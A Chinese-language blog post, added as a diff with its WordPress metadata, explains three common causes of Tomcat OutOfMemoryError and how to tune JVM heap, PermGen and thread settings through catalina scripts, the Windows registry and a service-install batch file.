@@ -1,0 +1,250 @@
+---
+layout: post
+title: Tomcat内存溢出的原因
+date: 2021-07-02 14:11:29.000000000 +08:00
+type: post
+parent_id: '0'
+published: true
+password: ''
+status: publish
+categories:
+- Java
+tags: []
+meta:
+  blocksy_post_meta_options: a:1:{s:17:"styles_descriptor";a:3:{s:6:"styles";a:3:{s:7:"desktop";s:0:"";s:6:"tablet";s:0:"";s:6:"mobile";s:0:"";}s:12:"google_fonts";a:0:{}s:7:"version";i:5;}}
+author:
+  login: gavin
+  email: 519077334@qq.com
+  display_name: gavin
+  first_name: ''
+  last_name: ''
+permalink: "/index.php/2021/07/02/tomcat%e5%86%85%e5%ad%98%e6%ba%a2%e5%87%ba%e7%9a%84%e5%8e%9f%e5%9b%a0/"
+---
+<div class="line number3 index2 alt2"><code class="csharp plain">Tomcat内存溢出的原因常见的一般会有下面三种情况：</code></div>
+<div class="line number4 index3 alt1"><code class="csharp plain">　　1.OutOfMemoryError： Java heap space</code></div>
+<div class="line number5 index4 alt2"><code class="csharp plain">　　2.OutOfMemoryError： PermGen space</code></div>
+<div class="line number6 index5 alt1"><code class="csharp plain">　　3.OutOfMemoryError： unable to create </code><code class="csharp keyword">new</code> <code class="csharp plain">native thread.</code></div>
+<div class="line number7 index6 alt2"><code class="csharp plain">　　Tomcat内存溢出解决方案</code></div>
+<div class="line number8 index7 alt1"><code class="csharp plain">　　对于前两种情况，在应用本身没有内存泄露的情况下可以用设置tomcat jvm参数来解决。（-Xms -Xmx -XX：PermSize -XX：MaxPermSize）</code></div>
+<div class="line number9 index8 alt2"><code class="csharp plain">　　最后一种可能需要调整操作系统和tomcat jvm参数同时调整才能达到目的。</code></div>
+<div class="line number10 index9 alt1"><code class="csharp plain">　　第一种：是堆溢出。</code></div>
+<div class="line number11 index10 alt2"><code class="csharp plain">　　原因分析：</code></div>
+<div class="line number12 index11 alt1"><code class="csharp plain">JVM堆的设置是指java程序运行过程中JVM可以调配使用的内存空间的设置.JVM在启动的时候会自动设置Heap size的值，其初始空间(即-Xms)是物理内存的1/64，最大空间(-Xmx)是物理内存的1/4。可以利用JVM提供的-Xmn -Xms -Xmx等选项可进行设置。Heap size 的大小是Young Generation 和Tenured Generaion 之和。</code></div>
+<div class="line number13 index12 alt2"><code class="csharp plain">在JVM中如果98％的时间是用于GC且可用的Heap size 不足2％的时候将抛出此异常信息。</code></div>
+<div class="line number14 index13 alt1"><code class="csharp plain">Heap Size 最大不要超过可用物理内存的80％，一般的要将-Xms和-Xmx选项设置为相同，而-Xmn为1/4的-Xmx值。</code></div>
+<div class="line number15 index14 alt2"><code class="csharp plain">　　没有内存泄露的情况下，调整-Xms -Xmx参数可以解决。</code></div>
+<div class="line number16 index15 alt1"><code class="csharp plain">　　-Xms：初始堆大小</code></div>
+<div class="line number17 index16 alt2"><code class="csharp plain">　　-Xmx：最大堆大小</code></div>
+<div class="line number18 index17 alt1"><code class="csharp plain">　　但堆的大小受下面三方面影响：</code></div>
+<div class="line number19 index18 alt2"><code class="csharp plain">　　1.相关操作系统的数据模型（32-bt还是64-bit）限制；（32位系统下，一般限制在1.5G~2G；我在2003 server 系统下（物理内存：4G和6G，jdk：1.6）测试 1612M，64位操作系统对内存无限制。）</code></div>
+<div class="line number20 index19 alt1"><code class="csharp plain">　　2.系统的可用虚拟内存限制；</code></div>
+<div class="line number21 index20 alt2"><code class="csharp plain">　　3.系统的可用物理内存限制。</code></div>
+<div class="line number22 index21 alt1"><code class="csharp plain">　　堆的大小可以使用 java -Xmx***M version 命令来测试。支持的话会出现jdk的版本号，不支持会报错。</code></div>
+<div class="line number23 index22 alt2"><code class="csharp plain">　　-Xms -Xmx一般配置成一样比较好比如</code><code class="csharp keyword">set</code> <code class="csharp plain">JAVA_OPTS= -Xms1024m -Xmx1024m</code></div>
+<div class="line number24 index23 alt1"><code class="csharp spaces"> </code></div>
+<div class="line number25 index24 alt2"><code class="csharp plain">其初始空间(即-Xms)是物理内存的1/64，最大空间(-Xmx)是物理内存的1/4。可以利用JVM提供的-Xmn -Xms -Xmx等选项可进行设置实例</code><code class="csharp plain">，以下给出1G内存环境下java jvm 的参数设置参考：</code></div>
+<div class="line number28 index27 alt1"><code class="csharp plain">JAVA_OPTS=</code><code class="csharp string">"-server -Xms800m -Xmx800m -XX:PermSize=64M -XX:MaxNewSize=256m -XX:MaxPermSize=128m -Djava.awt.headless=true "</code></div>
+<div class="line number29 index28 alt2"><code class="csharp plain">JAVA_OPTS="-server -Xms768m -Xmx768m -XX:PermSize=128m -XX:MaxPermSize=256m -XX:</code></div>
+<div class="line number30 index29 alt1"><code class="csharp plain">NewSize=192m -XX:MaxNewSize=384m"</code></div>
+<div class="line number31 index30 alt2"><code class="csharp plain">CATALINA_OPTS="-server -Xms768m -Xmx768m -XX:PermSize=128m -XX:MaxPermSize=256m</code></div>
+<div class="line number32 index31 alt1"><code class="csharp plain">-XX:NewSize=192m -XX:MaxNewSize=384m"</code></div>
+<div class="line number34 index33 alt1"><code class="csharp plain">服务器为1G内存：JAVA_OPTS=</code><code class="csharp string">"-server -Xms800m -Xmx800m -XX:PermSize=64M -XX:MaxNewSize=256m -XX:MaxPermSize=128m -Djava.awt.headless=true "</code></div>
+<div class="line number35 index34 alt2"><code class="csharp plain">服务器为64位、2G内存: JAVA_OPTS=</code><code class="csharp string">'-server -Xms1024m -Xmx1536m -XX:PermSize=128M -XX:MaxNewSize=256m -XX:MaxPermSize=256m'</code></div>
+<div class="line number37 index36 alt2"><code class="csharp plain">-------------------解决方案1：-----------------------------</code></div>
+<div class="line number38 index37 alt1"><code class="csharp plain">前提：是执行startup.bat启动tomcat的方式</code></div>
+<div class="line number39 index38 alt2"><code class="csharp plain">Linux服务器：</code></div>
+<div class="line number40 index39 alt1"><code class="csharp plain">在/usr/local/apache-tomcat-5.5.23/bin 目录下的catalina.sh</code></div>
+<div class="line number41 index40 alt2"><code class="csharp plain">添加：JAVA_OPTS=</code><code class="csharp string">'-Xms512m -Xmx1024m'</code></div>
+<div class="line number42 index41 alt1"><code class="csharp plain">或者 JAVA_OPTS=</code><code class="csharp string">"-server -Xms800m -Xmx800m -XX:MaxNewSize=256m"</code></div>
+<div class="line number43 index42 alt2"><code class="csharp plain">或者 CATALINA_OPTS=</code><code class="csharp string">"-server -Xms256m -Xmx300m"</code></div>
+<div class="line number44 index43 alt1"><code class="csharp plain">Windows服务器：</code></div>
+<div class="line number45 index44 alt2"><code class="csharp plain">在catalina.bat最前面加入</code></div>
+<div class="line number46 index45 alt1"><code class="csharp keyword">set</code> <code class="csharp plain">JAVA_OPTS=-Xms128m -Xmx350m</code></div>
+<div class="line number47 index46 alt2"><code class="csharp plain">或者</code><code class="csharp keyword">set</code> <code class="csharp plain">CATALINA_OPTS=-Xmx300M -Xms256M</code></div>
+<div class="line number48 index47 alt1"><code class="csharp plain">（区别是一个直接设置jvm内存，另一个设置tomcat内存，CATALINA_OPTS似乎可以与JAVA_OPTS不加区别的使用）</code></div>
+<div class="line number49 index48 alt2"><code class="csharp plain">基本参数说明</code></div>
+<div class="line number50 index49 alt1"><code class="csharp plain">-client，-server</code></div>
+<div class="line number51 index50 alt2"><code class="csharp plain">这两个参数用于设置虚拟机使用何种运行模式，一定要作为第一个参数，client模式启动比较快，但运行时性能和内存管理效率不如server模式，通常用于客户端应用程序。相反，server模式启动比client慢，但可获得更高的运行性能。</code></div>
+<div class="line number52 index51 alt1"><code class="csharp plain">在windows上，缺省的虚拟机类型为client模式，如果要使用server模式，就需要在启动虚拟机时加-server参数，以获得更高性能，对服务器端应用，推荐采用server模式，尤其是多个CPU的系统。在Linux，Solaris上缺省采用server模式。</code></div>
+<div class="line number53 index52 alt2"><code class="csharp plain">此外，在多cup下，建议用server模式</code></div>
+<div class="line number54 index53 alt1"><code class="csharp spaces"> </code></div>
+<div class="line number55 index54 alt2"><code class="csharp plain">-Xms&lt;size&gt;</code></div>
+<div class="line number56 index55 alt1"><code class="csharp plain">设置虚拟机可用内存堆的初始大小，缺省单位为字节，该大小为1024的整数倍并且要大于1MB，可用k(K)或m(M)为单位来设置较大的内存数。初始堆大小为2MB。加“m”说明是MB，否则就是KB了。</code></div>
+<div class="line number57 index56 alt2"><code class="csharp plain">例如：-Xms6400K，-Xms256M</code></div>
+<div class="line number58 index57 alt1"><code class="csharp plain">-Xmx&lt;size&gt;</code></div>
+<div class="line number59 index58 alt2"><code class="csharp plain">设置虚拟机的最大可用大小，缺省单位为字节。该值必须为1024整数倍，并且要大于2MB。可用k(K)或m(M)为单位来设置较大的内存数。缺省堆最大值为64MB。</code></div>
+<div class="line number60 index59 alt1"><code class="csharp plain">例如：-Xmx81920K，-Xmx80M</code></div>
+<div class="line number61 index60 alt2"><code class="csharp plain">当应用程序申请了大内存运行时虚拟机抛出java.lang.OutOfMemoryError: Java heap space错误，就需要使用-Xmx设置较大的可用内存堆。</code></div>
+<div class="line number62 index61 alt1"><code class="csharp plain">PermSize/MaxPermSize：定义Perm段的尺寸，即永久保存区域的大小，PermSize为JVM启动时初始化Perm的内存大小；MaxPermSize为最大可占用的Perm内存大小。在用户生产环境上一般将这两个值设为相同，以减少运行期间系统在内存申请上所花的开销。</code></div>
+<div class="line number63 index62 alt2"><code class="csharp plain">如果用startup.bat启动tomcat,OK设置生效.够成功的分配200M内存.</code></div>
+<div class="line number64 index63 alt1"><code class="csharp plain">-------------------解决方案2：------------------------</code></div>
+<div class="line number65 index64 alt2"><code class="csharp plain">前提：是执行startup.bat启动tomcat的方式</code></div>
+<div class="line number66 index65 alt1"><code class="csharp plain">手动设置Heap size</code></div>
+<div class="line number67 index66 alt2"><code class="csharp plain">Windows服务器：</code></div>
+<div class="line number68 index67 alt1"><code class="csharp plain">修改TOMCAT_HOME/bin/catalina.bat，在“echo </code><code class="csharp string">"Using CATALINA_BASE: $CATALINA_BASE"</code><code class="csharp plain">”上面加入以下行：</code></div>
+<div class="line number69 index68 alt2"><code class="csharp plain">Java代码</code></div>
+<div class="line number70 index69 alt1"><code class="csharp keyword">set</code> <code class="csharp plain">JAVA_OPTS=%JAVA_OPTS% -server -Xms800m -Xmx800m -XX:MaxNewSize=256m</code></div>
+<div class="line number71 index70 alt2"><code class="csharp spaces"> </code></div>
+<div class="line number72 index71 alt1"><code class="csharp plain">注：JAVA_OPTS是保留先前设置。</code></div>
+<div class="line number73 index72 alt2"><code class="csharp plain">Linux服务器：</code></div>
+<div class="line number74 index73 alt1"><code class="csharp plain">修改TOMCAT_HOME/bin/catalina.sh</code></div>
+<div class="line number75 index74 alt2"><code class="csharp plain">在“echo </code><code class="csharp string">"Using CATALINA_BASE: $CATALINA_BASE"</code><code class="csharp plain">”上面加入以下行：</code></div>
+<div class="line number76 index75 alt1"><code class="csharp plain">JAVA_OPTS=</code><code class="csharp string">"$JAVA_OPTS -server -Xms800m -Xmx800m -XX:MaxNewSize=256m"</code></div>
+<div class="line number77 index76 alt2"><code class="csharp spaces"> </code></div>
+<div class="line number78 index77 alt1"><code class="csharp plain">注：$JAVA_OPTS是保留先前设置。</code></div>
+<div class="line number79 index78 alt2"><code class="csharp plain">Linux服务器：</code></div>
+<div class="line number80 index79 alt1"><code class="csharp plain">修改TOMCAT_HOME/bin/catalina.sh</code></div>
+<div class="line number81 index80 alt2"><code class="csharp plain">在“echo </code><code class="csharp string">"Using CATALINA_BASE: $CATALINA_BASE"</code><code class="csharp plain">”上面加入以下行：</code></div>
+<div class="line number82 index81 alt1"><code class="csharp plain">JAVA_OPTS=</code><code class="csharp string">"$JAVA_OPTS -server -Xms800m -Xmx800m -XX:MaxNewSize=256m"</code></div>
+<div class="line number83 index82 alt2"><code class="csharp spaces"> </code></div>
+<div class="line number84 index83 alt1"><code class="csharp plain">注：$JAVA_OPTS是保留先前设置。</code></div>
+<div class="line number85 index84 alt2"><code class="csharp plain">-------------------解决方案3：-----------------------------</code></div>
+<div class="line number86 index85 alt1"><code class="csharp plain">前提：是执行windows的系统服务启动tomcat的方式</code></div>
+<div class="line number87 index86 alt2"><code class="csharp plain">但是如果不是执行startup.bat启动tomcat而是利用windows的系统服务启动tomcat服务,上面的设置就不生效了,</code></div>
+<div class="line number88 index87 alt1"><code class="csharp plain">就是说</code><code class="csharp keyword">set</code> <code class="csharp plain">JAVA_OPTS=-Xms128m -Xmx350m 没起作用.上面分配200M内存就OOM了..</code></div>
+<div class="line number89 index88 alt2"><code class="csharp plain">windows服务执行的是bin\tomcat.exe.他读取注册表中的值,而不是catalina.bat的设置.</code></div>
+<div class="line number90 index89 alt1"><code class="csharp plain">解决办法:</code></div>
+<div class="line number91 index90 alt2"><code class="csharp plain">修改注册表HKEY_LOCAL_MACHINE\SOFTWARE\Apache Software Foundation\Tomcat Service Manager\Tomcat5\Parameters\JavaOptions</code></div>
+<div class="line number92 index91 alt1"><code class="csharp plain">原值为</code></div>
+<div class="line number93 index92 alt2"><code class="csharp plain">-Dcatalina.home=</code><code class="csharp string">"C:\ApacheGroup\Tomcat 5.0"</code></div>
+<div class="line number94 index93 alt1"><code class="csharp plain">-Djava.endorsed.dirs=</code><code class="csharp string">"C:\ApacheGroup\Tomcat 5.0\common\endorsed"</code></div>
+<div class="line number95 index94 alt2"><code class="csharp plain">-Xrs</code></div>
+<div class="line number96 index95 alt1"><code class="csharp plain">加入 -Xms300m -Xmx350m</code></div>
+<div class="line number97 index96 alt2"><code class="csharp plain">重起tomcat服务,设置生效</code></div>
+<div class="line number98 index97 alt1"><code class="csharp plain">-------------------解决方案4：-----------------------------</code></div>
+<div class="line number99 index98 alt2"><code class="csharp plain">前提：是执行windows的系统服务启动tomcat的方式</code></div>
+<div class="line number100 index99 alt1"><code class="csharp plain">在安裝tomcat時若有勾選</code><code class="csharp string">"NT Service(NT/2000/XP only)"</code></div>
+<div class="line number101 index100 alt2"><code class="csharp plain">則安裝完成後在安裝目錄的</code><code class="csharp string">"bin"</code><code class="csharp plain">目錄裡會有一個tomcat.exe的檔案</code></div>
+<div class="line number102 index101 alt1"><code class="csharp plain">先把tomcat的服務停掉</code></div>
+<div class="line number103 index102 alt2"><code class="csharp plain">在命令列模式下（运行里输入CMD）</code></div>
+<div class="line number104 index103 alt1"><code class="csharp plain">將目錄切換到tomcat的bin目錄</code></div>
+<div class="line number105 index104 alt2"><code class="csharp plain">用下面的命令把服務移除</code></div>
+<div class="line number107 index106 alt2"><code class="csharp plain">tomcat -uninstall </code><code class="csharp string">"Apache Tomcat 4.1"</code></div>
+<div class="line number109 index108 alt2"><code class="csharp plain">接下來，写个批处理。</code></div>
+<div class="line number110 index109 alt1"><code class="csharp plain">內容如下</code></div>
+<div class="line number111 index110 alt2"><code class="csharp keyword">set</code> <code class="csharp plain">SERVICENAME=Apache Tomcat 4.1</code></div>
+<div class="line number112 index111 alt1"><code class="csharp keyword">set</code> <code class="csharp plain">CATALINA_HOME=E:\Tomcat 4.1.24</code></div>
+<div class="line number113 index112 alt2"><code class="csharp keyword">set</code> <code class="csharp plain">CLASSPATH=D:\j2sdk1.4.1_01\lib</code></div>
+<div class="line number114 index113 alt1"><code class="csharp keyword">set</code> <code class="csharp plain">JAVACLASSPATH=%CLASSPATH%</code></div>
+<div class="line number115 index114 alt2"><code class="csharp keyword">set</code> <code class="csharp plain">JAVACLASSPATH=%JAVACLASSPATH%;?TALINA_HOME%\bin\bootstrap.jar</code></div>
+<div class="line number116 index115 alt1"><code class="csharp keyword">set</code> <code class="csharp plain">JAVACLASSPATH=%JAVACLASSPATH%;?TALINA_HOME%\common\lib\servlet.jar</code></div>
+<div class="line number117 index116 alt2"><code class="csharp keyword">set</code> <code class="csharp plain">JAVACLASSPATH=%JAVACLASSPATH%;%JAVA_HOME%\lib\tools.jar</code></div>
+<div class="line number118 index117 alt1"><code class="csharp plain">tomcat.exe -install </code><code class="csharp string">"%SERVICENAME%"</code> <code class="csharp string">"%JAVA_HOME%\jre\bin\server\jvm.dll"</code> <code class="csharp plain">-Djava.</code><code class="csharp keyword">class</code><code class="csharp plain">.path=</code><code class="csharp string">"%JAVACLASSPATH%"</code> <code class="csharp plain">-Dcatalina.home=</code><code class="csharp string">"?TALINA_HOME%"</code> <code class="csharp plain">-Xms512m -Xmx768m -start org.apache.catalina.startup.Bootstrap -</code><code class="csharp keyword">params</code> <code class="csharp plain">start -stop org.apache.catalina.startup.Bootstrap -</code><code class="csharp keyword">params</code> <code class="csharp plain">stop -</code><code class="csharp keyword">out</code> <code class="csharp string">"?TALINA_HOME%\logs\stdout.log"</code> <code class="csharp plain">-err </code><code class="csharp string">"?TALINA_HOME%\logs\stderr.log"</code></div>
+<div class="line number119 index118 alt2"><code class="csharp plain">注意，从 tomcat.exe -install开始的是最后一行！不要手工回车换行把这一行分成了好几段。保存后在命令行下执行这个bat文件，注意执行的时候将“服务”窗口关闭。</code></div>
+<div class="line number120 index119 alt1"><code class="csharp spaces"> </code></div>
+<div class="line number121 index120 alt2"><code class="csharp plain">第二种：永久保存区域溢出</code></div>
+<div class="line number122 index121 alt1"><code class="csharp plain">　原因分析：</code></div>
+<div class="line number123 index122 alt2"><code class="csharp plain">PermGen space的全称是Permanent Generation space,是指内存的永久保存区域，这块内存主要是被JVM存放Class和Meta信息的,Class在被Loader时就会被放到PermGen space中，它和存放类实例(Instance)的Heap区域不同,GC(Garbage Collection)不会在主程序运行期对PermGen space进行清理，所以如果你的应用中有很CLASS的话,就很可能出现PermGen space错误，这种错误常见在web服务器对JSP进行pre compile的时候。如果你的WEB APP下都用了大量的第三方jar, 其大小超过了jvm默认的大小(4M)那么就会产生此错误信息了。但目前的hibernate和spring项目中也很容易出现这样的问题。可能是由于这些框架会动态</code><code class="csharp keyword">class</code><code class="csharp plain">，而且jvm的gc是不会清理PemGen space的，超过了jvm默认的大小(4M)，导致内存溢出。</code></div>
+<div class="line number124 index123 alt1"><code class="csharp plain">　　建议：将相同的第三方jar文件移置到tomcat/shared/lib目录下，这样可以达到减少jar 文档重复占用内存的目的。</code></div>
+<div class="line number125 index124 alt2"><code class="csharp plain">这一个一般是加大-XX：PermSize -XX：MaxPermSize 来解决问题。</code></div>
+<div class="line number126 index125 alt1"><code class="csharp plain">　　-XX：PermSize 永久保存区域初始大小</code></div>
+<div class="line number127 index126 alt2"><code class="csharp plain">　　-XX：PermSize 永久保存区域初始最大值</code></div>
+<div class="line number128 index127 alt1"><code class="csharp plain">　　这一般结合第一条使用，比如 </code><code class="csharp keyword">set</code> <code class="csharp plain">JAVA_OPTS= -Xms1024m -Xmx1024m -XX：PermSize=128M -XX：PermSize=256M</code></div>
+<div class="line number129 index128 alt2"><code class="csharp plain">　　有一点需要注意：java -Xmx***M version 命令来测试的最大堆内存是 -Xmx与 -XX：PermSize的和比如系统支持最大的jvm堆大小事1.5G，那 -Xmx1024m -XX：PermSize=768M 是无法运行的。</code></div>
+<div class="line number130 index129 alt1"><code class="csharp plain">-----------------解决方案1：-------------------------</code></div>
+<div class="line number131 index130 alt2"><code class="csharp plain">Linux服务器：</code></div>
+<div class="line number132 index131 alt1"><code class="csharp plain">在catalina.sh的第一行增加：</code></div>
+<div class="line number133 index132 alt2"><code class="csharp plain">JAVA_OPTS=</code></div>
+<div class="line number134 index133 alt1"><code class="csharp plain">-Xms64m</code></div>
+<div class="line number135 index134 alt2"><code class="csharp plain">-Xmx256m</code></div>
+<div class="line number136 index135 alt1"><code class="csharp plain">-XX:PermSize=128M</code></div>
+<div class="line number137 index136 alt2"><code class="csharp plain">-XX:MaxNewSize=256m</code></div>
+<div class="line number138 index137 alt1"><code class="csharp plain">-XX:MaxPermSize=256m</code></div>
+<div class="line number139 index138 alt2"><code class="csharp plain">或者</code></div>
+<div class="line number140 index139 alt1"><code class="csharp plain">在“echo </code><code class="csharp string">"Using CATALINA_BASE: $CATALINA_BASE"</code><code class="csharp plain">”上面加入以下行：</code></div>
+<div class="line number141 index140 alt2"><code class="csharp plain">JAVA_OPTS="-server -XX:PermSize=64M -XX:MaxPermSize=128m</code></div>
+<div class="line number142 index141 alt1"><code class="csharp plain">Windows服务器：</code></div>
+<div class="line number143 index142 alt2"><code class="csharp plain">在catalina.bat的第一行增加：</code></div>
+<div class="line number144 index143 alt1"><code class="csharp keyword">set</code> <code class="csharp plain">JAVA_OPTS=-Xms64m -Xmx256m -XX:PermSize=128M -XX:MaxNewSize=256m -XX:MaxPermSize=256m</code></div>
+<div class="line number145 index144 alt2"><code class="csharp plain">-----------------解决方案2：------------------------</code></div>
+<div class="line number146 index145 alt1"><code class="csharp plain">修改TOMCAT_HOME/bin/catalina.bat（Linux下为catalina.sh），在Java代码</code></div>
+<div class="line number147 index146 alt2"><code class="csharp plain">“echo </code><code class="csharp string">"Using CATALINA_BASE: $CATALINA_BASE"</code><code class="csharp plain">”上面加入以下行：</code></div>
+<div class="line number148 index147 alt1"><code class="csharp keyword">set</code> <code class="csharp plain">JAVA_OPTS=%JAVA_OPTS% -server -XX:PermSize=128M -XX:MaxPermSize=512m</code></div>
+<div class="line number149 index148 alt2"><code class="csharp spaces"> </code></div>
+<div class="line number150 index149 alt1"><code class="csharp plain">“echo </code><code class="csharp string">"Using CATALINA_BASE: $CATALINA_BASE"</code><code class="csharp plain">”上面加入以下行：</code></div>
+<div class="line number151 index150 alt2"><code class="csharp keyword">set</code> <code class="csharp plain">JAVA_OPTS=%JAVA_OPTS% -server -XX:PermSize=128M -XX:MaxPermSize=512m</code></div>
+<div class="line number152 index151 alt1"><code class="csharp plain">catalina.sh下为：</code></div>
+<div class="line number153 index152 alt2"><code class="csharp plain">Java代码</code></div>
+<div class="line number154 index153 alt1"><code class="csharp plain">JAVA_OPTS=</code><code class="csharp string">"$JAVA_OPTS -server -XX:PermSize=128M -XX:MaxPermSize=512m"</code></div>
+<div class="line number155 index154 alt2"><code class="csharp spaces"> </code></div>
+<div class="line number156 index155 alt1"><code class="csharp plain">JAVA_OPTS=</code><code class="csharp string">"$JAVA_OPTS -server -XX:PermSize=128M -XX:MaxPermSize=512m"</code></div>
+<div class="line number157 index156 alt2"><code class="csharp spaces"> </code></div>
+<div class="line number158 index157 alt1"><code class="csharp plain">　　第三种：无法创建新的线程。</code></div>
+<div class="line number159 index158 alt2"><code class="csharp plain">　　这种现象比较少见，也比较奇怪，主要是和jvm与系统内存的比例有关。</code></div>
+<div class="line number160 index159 alt1"><code class="csharp plain">　　这种怪事是因为JVM已经被系统分配了大量的内存（比如1.5G），并且它至少要占用可用内存的一半。有人发现，在线程个数很多的情况下，你分配给JVM的内存越多，那么，上述错误发生的可能性就越大。</code></div>
+<div class="line number161 index160 alt2"><code class="csharp plain">　　原因分析</code></div>
+<div class="line number162 index161 alt1"><code class="csharp plain">（从这个blog中了解到原因：http:</code><code class="csharp comments">//hi.baidu.com/hexiong/blog/item/16dc9e518fb10c2542a75b3c.html）：</code></div>
+<div class="line number163 index162 alt2"><code class="csharp plain">　　每一个32位的进程最多可以使用2G的可用内存，因为另外2G被操作系统保留。这里假设使用1.5G给JVM，那么还余下500M可用内存。这500M内存中的一部分必须用于系统dll的加载，那么真正剩下的也许只有400M，现在关键的地方出现了：当你使用Java创建一个线程，在JVM的内存里也会创建一个Thread对象，但是同时也会在操作系统里创建一个真正的物理线程（参考JVM规范），操作系统会在余下的 400兆内存里创建这个物理线程，而不是在JVM的1500M的内存堆里创建。在jdk1.4里头，默认的栈大小是256KB，但是在jdk1.5里头，默认的栈大小为1M每线程，因此，在余下400M的可用内存里边我们最多也只能创建400个可用线程。</code></div>
+<div class="line number164 index163 alt1"><code class="csharp plain">这样结论就出来了，要想创建更多的线程，你必须减少分配给JVM的最大内存。还有一种做法是让JVM宿主在你的JNI代码里边。</code></div>
+<div class="line number165 index164 alt2"><code class="csharp plain">　　给出一个有关能够创建线程的最大个数的估算公式：</code></div>
+<div class="line number166 index165 alt1"><code class="csharp plain">　　（MaxProcessMemory - JVMMemory - ReservedOsMemory） / （ThreadStackSize） = Number of threads</code></div>
+<div class="line number167 index166 alt2"><code class="csharp plain">　　对于jdk1.5而言，假设操作系统保留120M内存：</code></div>
+<div class="line number168 index167 alt1"><code class="csharp plain">　　1.5GB JVM： （2GB-1.5Gb-120MB）/（1MB） = ~380 threads</code></div>
+<div class="line number169 index168 alt2"><code class="csharp plain">　　1.0GB JVM： （2GB-1.0Gb-120MB）/（1MB） = ~880 threads</code></div>
+<div class="line number170 index169 alt1"><code class="csharp plain">　　在2000/XP/2003的boot.ini里头有一个启动选项，好像是：/PAE /3G ，可以让用户进程最大内存扩充至3G，这时操作系统只能占用最多1G的虚存。那样应该可以让JVM创建更多的线程。</code></div>
+<div class="line number171 index170 alt2"><code class="csharp plain">　　因此这种情况需要结合操作系统进行相关调整。</code></div>
+<div class="line number172 index171 alt1"><code class="csharp plain">　　因此：我们需要结合不同情况对tomcat内存分配进行不同的诊断才能从根本上解决问题。</code></div>
+<div class="line number173 index172 alt2"><code class="csharp spaces"> </code></div>
+<div class="line number174 index173 alt1"><code class="csharp plain">检测当前JVM内存使用情况：</code></div>
+<div class="line number175 index174 alt2"><code class="csharp plain">System.</code><code class="csharp keyword">out</code><code class="csharp plain">.println(</code><code class="csharp string">"JVM MAX MEMORY: "</code> <code class="csharp plain">+ Runtime.getRuntime().maxMemory()/1024/1024+</code><code class="csharp string">"M"</code><code class="csharp plain">);</code></div>
+<div class="line number176 index175 alt1"><code class="csharp plain">System.</code><code class="csharp keyword">out</code><code class="csharp plain">.println(</code><code class="csharp string">"JVM IS USING MEMORY:"</code> <code class="csharp plain">+ Runtime.getRuntime().totalMemory()/1024/1024+</code><code class="csharp string">"M"</code><code class="csharp plain">);</code></div>
+<div class="line number177 index176 alt2"><code class="csharp plain">System.</code><code class="csharp keyword">out</code><code class="csharp plain">.println(</code><code class="csharp string">"JVM IS FREE MEMORY:"</code> <code class="csharp plain">+ Runtime.getRuntime().freeMemory()/1024/1024+</code><code class="csharp string">"M"</code><code class="csharp plain">);</code></div>
+<div class="line number178 index177 alt1"><code class="csharp spaces"> </code></div>
+<div class="line number179 index178 alt2"><code class="csharp plain">这三个方法都是说JVM的内存使用情况而不是操作系统的内存；</code></div>
+<div class="line number180 index179 alt1"><code class="csharp plain">　　maxMemory()这个方法返回的是java虚拟机（这个进程）能构从操作系统那里挖到的最大的内存，以字节为单位，如果在运行java程序的时候，没有添加-Xmx参数，那么就是64兆，也就是说maxMemory()返回的大约是64*1024*1024字节，这是java虚拟机默认情况下能从操作系统那里挖到的最大的内存。如果添加了-Xmx参数，将以这个参数后面的值为准，例如java -cp ClassPath -Xmx512m ClassName，那么最大内存就是512*1024*0124字节。</code></div>
+<div class="line number181 index180 alt2"><code class="csharp spaces"> </code></div>
+<div class="line number182 index181 alt1"><code class="csharp plain">　　totalMemory()这个方法返回的是java虚拟机现在已经从操作系统那里挖过来的内存大小，也就是java虚拟机这个进程当时所占用的所有内存。如果在运行java的时候没有添加-Xms参数，那么，在java程序运行的过程的，内存总是慢慢的从操作系统那里挖的，基本上是用多少挖多少，直挖到maxMemory()为止，所以totalMemory()是慢慢增大的。如果用了-Xms参数，程序在启动的时候就会无条件的从操作系统中挖-Xms后面定义的内存数，然后在这些内存用的差不多的时候，再去挖。</code></div>
+<div class="line number183 index182 alt2"><code class="csharp plain">freeMemory()是什么呢，刚才讲到如果在运行java的时候没有添加-Xms参数，那么，在java程序运行的过程的，内存总是慢慢的从操作系统那里挖的，基本上是用多少挖多少，但是java虚拟机100％的情况下是会稍微多挖一点的，这些挖过来而又没有用上的内存，实际上就是freeMemory()，所以freeMemory()的值一般情况下都是很小的，但是如果你在运行java程序的时候使用了-Xms，这个时候因为程序在启动的时候就会无条件的从操作系统中挖-Xms后面定义的内存数，这个时候，挖过来的内存可能大部分没用上，所以这个时候freeMemory()可能会有些</code></div>
+<div class="line number184 index183 alt1"><code class="csharp plain">--------------------解决方案--------------------------</code></div>
+<div class="line number185 index184 alt2"><code class="csharp plain">JVM堆大小的调整</code></div>
+<div class="line number186 index185 alt1"><code class="csharp plain">　　Sun HotSpot 1.4.1使用分代收集器，它把堆分为三个主要的域：新域、旧域以及永久域。Jvm生成的所有新对象放在新域中。一旦对象经历了一定数量的垃圾收集循环后，便获得使用期并进入旧域。在永久域中jvm则存储</code><code class="csharp keyword">class</code><code class="csharp plain">和method对象。就配置而言，永久域是一个独立域并且不认为是堆的一部分。</code></div>
+<div class="line number187 index186 alt2"><code class="csharp plain">　　下面介绍如何控制这些域的大小。可使用-Xms和-Xmx 控制整个堆的原始大小或最大值。</code></div>
+<div class="line number188 index187 alt1"><code class="csharp plain">　　下面的命令是把初始大小设置为128M：</code></div>
+<div class="line number189 index188 alt2"><code class="csharp plain">　　java –Xms128m</code></div>
+<div class="line number190 index189 alt1"><code class="csharp plain">　　–Xmx256m为控制新域的大小，可使用-XX:NewRatio设置新域在堆中所占的比例。</code></div>
+<div class="line number191 index190 alt2"><code class="csharp plain">　　下面的命令把整个堆设置成128m，新域比率设置成3，即新域与旧域比例为1：3，新域为堆的1/4或32M：</code></div>
+<div class="line number192 index191 alt1"><code class="csharp plain">java –Xms128m –Xmx128m</code></div>
+<div class="line number193 index192 alt2"><code class="csharp plain">–XX:NewRatio =3可使用-XX:NewSize和-XX:MaxNewsize设置新域的初始值和最大值。</code></div>
+<div class="line number194 index193 alt1"><code class="csharp plain">　　下面的命令把新域的初始值和最大值设置成64m:</code></div>
+<div class="line number195 index194 alt2"><code class="csharp plain">java –Xms256m –Xmx256m –Xmn64m</code></div>
+<div class="line number196 index195 alt1"><code class="csharp plain">　　永久域默认大小为4m。运行程序时，jvm会调整永久域的大小以满足需要。每次调整时，jvm会对堆进行一次完全的垃圾收集。</code></div>
